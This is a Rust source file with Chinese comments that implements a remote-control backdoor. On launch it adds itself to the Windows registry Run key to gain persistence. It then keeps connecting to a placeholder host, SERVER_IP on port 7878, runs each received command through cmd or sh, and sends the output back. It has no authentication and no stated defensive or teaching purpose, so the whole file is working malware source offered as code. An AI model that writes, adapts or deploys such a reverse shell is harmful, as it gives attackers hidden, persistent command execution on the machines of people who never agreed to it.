use std::{
    io::{Read, Write},
    net::TcpStream,
    process::Command,
    thread,
    time::Duration,
};

use winreg::{
    enums::{HKEY_CURRENT_USER, REG_SZ},
    RegKey,
};

fn main() {
    // 设置开机自启动
    set_autostart().expect("Failed to set autostart");

    // 主循环，尝试连接服务端
    loop {
        if let Ok(mut stream) = TcpStream::connect("SERVER_IP:7878") {
            println!("Connected to server");
            handle_connection(&mut stream);
        } else {
            println!("Failed to connect, retrying in 5 seconds...");
            thread::sleep(Duration::from_secs(5));
        }
    }
}

fn handle_connection(stream: &mut TcpStream) {
    let mut buffer = [0; 1024];

    loop {
        match stream.read(&mut buffer) {
            Ok(size) if size > 0 => {
                let command = String::from_utf8_lossy(&buffer[..size]);
                println!("Received command: {}", command);

                // 执行命令并获取输出
                let output = if cfg!(target_os = "windows") {
                    Command::new("cmd")
                        .args(&["/C", &command])
                        .output()
                        .expect("Failed to execute command")
                } else {
                    Command::new("sh")
                        .arg("-c")
                        .arg(&command)
                        .output()
                        .expect("Failed to execute command")
                };

                // 发送执行结果回服务端
                let result = if output.status.success() {
                    String::from_utf8_lossy(&output.stdout).to_string()
                } else {
                    String::from_utf8_lossy(&output.stderr).to_string()
                };

                stream.write_all(result.as_bytes()).unwrap();
            }
            Ok(_) => break, // 连接关闭
            Err(e) => {
                println!("Error reading from stream: {}", e);
                break;
            }
        }
    }
}

fn set_autostart() -> std::io::Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
    let (key, _) = hkcu.create_subkey(path)?;

    // 获取当前可执行文件路径
    let exe_path = std::env::current_exe()?;
    
    // 设置注册表项
    key.set_value("RustCommandClient", &exe_path.to_string_lossy().into_owned() as &str)?;

    Ok(())
}
